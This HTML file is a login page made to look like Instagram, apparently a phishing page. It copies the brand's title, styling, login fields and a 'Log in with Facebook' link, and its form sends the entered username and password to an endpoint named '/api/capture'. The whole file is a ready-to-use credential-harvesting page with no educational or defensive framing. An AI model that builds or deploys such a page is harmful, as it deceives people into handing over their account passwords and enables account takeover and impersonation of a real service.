<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; max-width: 350px; width: 100%; }
        .logo { font-size: 36px; font-weight: 300; margin-bottom: 30px; color: #262626; font-family: 'Segoe UI'; }
        input { width: 100%; padding: 12px; margin: 4px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; }
        button { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; margin-top: 12px; cursor: pointer; }
        button:hover { background: #1877f2; }
        .or { display: flex; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
        .or::before, .or::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; margin: auto; }
        .or span { margin: 0 18px; }
        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form action="/api/capture" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="or"><span>OR</span></div>
        <div style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">Log in with Facebook</div>
        <div class="footer">Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: 600;">Sign up</a></div>
    </div>
</body>
</html>
